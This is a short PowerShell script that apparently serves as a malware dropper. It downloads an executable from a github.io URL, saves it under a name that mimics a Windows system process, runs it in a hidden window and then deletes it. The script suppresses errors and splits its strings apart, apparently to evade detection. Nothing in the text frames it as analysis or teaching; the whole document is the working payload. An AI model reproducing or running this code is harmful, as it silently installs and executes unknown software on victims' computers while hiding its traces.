$ErrorActionPreference='SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol=3072
$a=$env:LOCALAPPDATA
$b='\Microsoft\Win'+'dows\Run'+'timeBro'+'ker_svc.exe'
$p=$a+$b
$h='https://fairytail5d'+'0.github.io/ab'+'obis/sync.exe'
$wc=New-Object System.Net.WebClient
$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
$wc.DownloadFile($h,$p)
if(Test-Path $p){
    $si=New-Object System.Diagnostics.ProcessStartInfo
    $si.FileName=$p
    $si.WindowStyle=[System.Diagnostics.ProcessWindowStyle]::Hidden
    $si.CreateNoWindow=$true
    [System.Diagnostics.Process]::Start($si)|Out-Null
    Start-Sleep -Milliseconds 800
    Remove-Item $p -Force -EA 0
}
